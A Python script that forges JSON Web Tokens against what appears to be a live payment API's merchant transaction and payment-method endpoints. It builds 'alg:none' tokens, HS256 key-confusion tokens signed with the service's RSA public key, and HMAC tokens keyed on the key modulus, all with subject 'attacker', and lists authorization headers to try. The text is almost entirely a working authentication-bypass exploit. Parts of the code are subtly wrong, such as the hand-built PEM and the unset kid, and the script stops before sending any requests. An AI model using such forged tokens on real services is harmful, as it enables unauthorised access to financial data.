import json, base64, hmac, hashlib, subprocess, time
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def b64d(s): return base64.urlsafe_b64decode(s + "="*(-len(s)%4))
jwks=json.load(open("stg_jwks.json"))["keys"]
k=next(x for x in jwks if x.get("kid")=="loadtesting")
pub=b64d(k["n"]); print("loadtesting kid modulus bytes:",len(pub))

def hdr(a): return b64u(json.dumps({"alg":a,"typ":"JWT"}).encode())
claims={"iss":"https://auth.sam-app.ro","sub":"attacker","aud":"https://api.sam-app.ro","exp":4102444800,"scp":["readers"],"iat":1789000000}
pl=b64u(json.dumps(claims).encode())

# alg:none
t_none=f"{hdr('none')}.{pl}."
# HS256 confusion using raw RSA public key PEM bytes as HMAC secret
pem=("-----BEGIN PUBLIC KEY-----\n"+"\n".join(base64.b64encode(pub[i:i+64]).decode() for i in range(0,len(pub),64))+"\n-----END PUBLIC KEY-----").encode()
sig=hmac.new(pem,f"{hdr('HS256')}.{pl}".encode(),hashlib.sha256).digest()
t_hs=f"{hdr('HS256')}.{pl}.{b64u(sig)}"
# HS256 with kid=loadtesting, secret = b64 of n
t_hs2=f"{hdr('HS256')}.{pl}.{b64u(hmac.new(k['n'].encode(),f'{hdr(chr(72)+chr(83)+chr(50)+chr(53)+chr(54))}.{pl}'.encode(),hashlib.sha256).digest())}"

paths=["/v0.1/merchants/MH4H92C7/transactions?limit=1","/v0.1/transactions","/v0.1/merchants/MH4H92C7/payment-methods"]
states=[("noauth",None),("malformed","Bearer not.a.token"),("alg_none",f"Bearer {t_none}"),("hs256_pubkeypem",f"Bearer {t_hs}"),("hs256_modn",f"Bearer {t_hs2}")]
